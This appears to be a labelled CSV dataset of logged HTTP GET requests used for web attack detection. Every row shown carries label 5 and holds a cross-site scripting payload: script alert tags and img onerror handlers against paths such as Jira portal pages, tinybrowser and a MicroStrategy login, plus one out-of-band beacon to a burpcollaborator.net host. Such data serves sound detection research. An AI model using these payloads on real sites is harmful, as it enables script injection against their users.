id,method,user_agent,url,refer,body,lable
1232,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36",/Vnaoj%3CVnaoj%3EVnaoj%27Vnaoj%22Vnaoj/Vnaoj-Vnaoj?hl=%3C%2FboDy%3E%3CImG+id%3D%27EodyzkHu%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CBoDY%3E&pref=%3C%2FbOdy%3E%3CIMG+id%3D%27rFpgFujs%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CBoDy%3E&pval=%3C%2FboDy%3E%3CImg+id%3D%27SDpflpNJ%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CboDy%3E&q=%3C%2FBodY%3E%3CimG+id%3D%27WFKYyMOs%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CboDY%3E&sa=%3C%2FbodY%3E%3CiMg+id%3D%27vAJPmfHg%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CBodY%3E&usg=%3C%2FBoDY%3E%3CIMg+id%3D%27RKHDyvbZ%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CBody%3E&ust=%3C%2FBODy%3E%3CimG+id%3D%27DiKCYJOh%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CbOdY%3E,,,5
2750,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/does_not_exist%22%22%3E%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E%3Cimg%20src=x,,,5
2887,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=%3Cscript%3Ealert(1)%3C/script%3E&Search=Search,,,5
3522,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1657265258')</script>,,,5
215,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36",/%3C/bODy%3E%3CiMG%20id=%27jaWEUjao%27%20src=1%20onerror=%27prompt%281%29%27%3E%3CbODy%3E/%3C/bODy%3E%3CiMG%20id=%27jaWEUjao%27%20src=1%20onerror=%27prompt%281%29%27%3E%3CbODy%3E,https://api.csdn.net/oauth/authorize?client_id=1000001&redirect_uri=http://www.iteye.com/auth/csdn/callback&response_type=%22https%3A%2F%2Fapi.csdn.net%2Foauth%2Fauthorize%3Fclient_id%3D1000001%26redirect_uri%3Dhttp%3A%2F%2Fwww.iteye.com%2Fauth%2Fcsdn%2Fcallback%26response_type%3D%22%3E%3Cimg%20src%3Dx%20onerror%3Deval(window.name)%3E,,5
27,GET,python-requests/2.18.4,/Activity/edit?start_time=2016-07-05+00%3A00%3A00&end_time=2016-12-31+00%3A00%3A00&image=88888&url=http://www.hacker.org/&is_popup=0&sequence=0&detail=%3Cp%3E%E6%A0%B9%E6%8D%AE%E4%BA%A7%E5%93%81%E9%9C%80%E6%B1%82%EF%BC%8C%E2%80%9C%E4%B8%BB%E6%92%AD%E8%AF%84%E7%BA%A7%E7%94%B3%E8%AF%B7%E2%80%9D%E7%9A%84%E9%9C%80%E6%B1%82%E6%9C%89%E4%B8%AA%E5%B0%8F%E8%B0%83%E6%95%B4%EF%BC%9A%3C%2Fp%3E%3Cp%3E1.+%E7%94%B3%E8%AF%B7%E6%B5%81%E7%A8%8B%E8%B0%83%E6%95%B4%EF%BC%9A%E4%B9%8B%E5%89%8D%E5%85%88%E8%BE%93%E5%85%A5%E3%80%90%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E3%80%91%E5%86%8D%E9%80%89%E6%8B%A9%E3%80%90%E6%A0%87%E7%AD%BE%E3%80%91%EF%BC%8C%E6%94%B9%E4%B8%BA%E5%85%88%E9%80%89%E6%8B%A9%E3%80%90%E6%A0%87%E7%AD%BE%E3%80%91%E5%86%8D%E8%BE%93%E5%85%A5%E3%80%90%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E3%80%91%EF%BC%882%E4%B8%AA%E9%A1%BA%E5%BA%8F%E9%A2%A0%E5%80%92%E4%B8%8B%EF%BC%89%E3%80%82%3C%2Fp%3E%3Cp%3E2.+%E4%BF%A1%E6%81%AF%E4%BF%9D%E5%AD%98%E6%9C%BA%E5%88%B6%EF%BC%9A%E7%94%A8%E6%88%B7%E6%AF%8F%E5%AE%8C%E6%88%901%E4%B8%AA%E7%94%B3%E8%25&id=20?title=%E4%B8%BB%E6%92%AD%E8%AF%84%E7%BA%A7%3Cimg%20src=1%20onerror=alert(42873)%3E,,,5
175,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/main.js?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fog86u84m8ve6nt0fojus2v9jjap4d911spmcc01X%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1,http://121.4.111.58:3000/,"GET /main.js?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fog86u84m8ve6nt0fojus2v9jjap4d911spmcc01X%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1 HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/  ",5
3526,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/scripts/tinybrowser/upload.php?goodfiles=1><script>alert('tinybrowser_multiple_xss')</script>,,,5
4263,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/printenv.shtml?%3Cscript%3Ealert(%27xss%27)%3C/script%3E,,,5
4827,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/microstrategy7/Login.asp?Server=Server001&Project=Project001&Port=0&Uid=Uid001&Msg=%22%3E%3Cscript%3Ealert(/2CR2UN7iHg3TIC6K0i1CtZN5X3e/)%3B%3C%2Fscript%3E%3C,,,5
